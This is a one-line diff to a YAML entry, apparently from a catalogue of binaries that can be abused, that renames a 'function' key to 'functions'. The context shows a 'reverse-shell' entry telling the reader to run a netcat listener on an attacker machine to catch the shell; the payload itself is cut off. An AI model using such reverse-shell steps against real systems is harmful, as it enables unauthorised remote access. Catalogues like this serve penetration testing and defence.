@@ -1,5 +1,5 @@
 ---
-function:
+functions:
   reverse-shell:
     - description: Run `nc -l -p 12345` on the attacker box to receive the shell.
       code: |
